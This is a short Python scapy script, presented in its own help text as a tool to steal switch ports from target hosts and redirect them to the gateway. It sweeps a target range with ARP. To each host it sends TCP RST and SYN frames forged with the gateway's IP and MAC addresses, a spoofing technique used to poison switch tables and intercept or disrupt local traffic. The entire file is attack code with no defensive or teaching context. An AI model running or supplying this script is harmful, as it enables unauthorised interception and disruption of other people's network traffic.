#!/usr/bin/env python3

import argparse, scapy.all as scapy, random

parser = argparse.ArgumentParser(description="A script to steal ports from the target and redirect them to the gateway")
parser.add_argument("-i", "--interface", type=str, required=True, help="The network interface to use")
parser.add_argument("-t", "--target", type=str, required=True, help="The target IP address or range")
parser.add_argument("-g", "--gateway", type=str, required=True, help="The gateway IP address")
args = parser.parse_args()

gateway_mac = scapy.getmacbyip(args.gateway)

hosts = scapy.arping(args.target, iface=args.interface, verbose=False)[0]

for host in hosts:
    host_ip = host[1].psrc
    host_mac = host[1].hwsrc

    src_port = random.randint(1024, 65535)

    packet = scapy.IP(src=args.gateway, dst=host_ip) / scapy.TCP(sport=src_port, dport=80, flags="R", seq=100)

    scapy.sendp(scapy.Ether(src=gateway_mac, dst=host_mac) / packet, iface=args.interface, verbose=False)

    packet = scapy.IP(src=args.gateway, dst=host_ip) / scapy.TCP(sport=src_port, dport=80, flags="S", seq=100)

    scapy.sendp(scapy.Ether(src=gateway_mac, dst=host_mac) / packet, iface=args.interface, verbose=False)
